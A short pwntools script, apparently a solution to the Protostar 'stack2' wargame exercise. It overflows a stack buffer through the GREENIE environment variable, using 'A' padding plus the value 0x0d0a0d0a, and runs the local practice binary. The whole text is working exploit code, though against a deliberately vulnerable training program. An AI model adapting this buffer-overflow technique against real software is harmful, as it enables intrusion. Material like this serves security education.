from pwn import *
enval = b'A' * (0x50 - 0xc)
enval += p32(0x0d0a0d0a)

env = {"GREENIE" : enval}

p = process('./stack2', env=env)

data = p.recv(1024)

print(data.decode('utf-8'))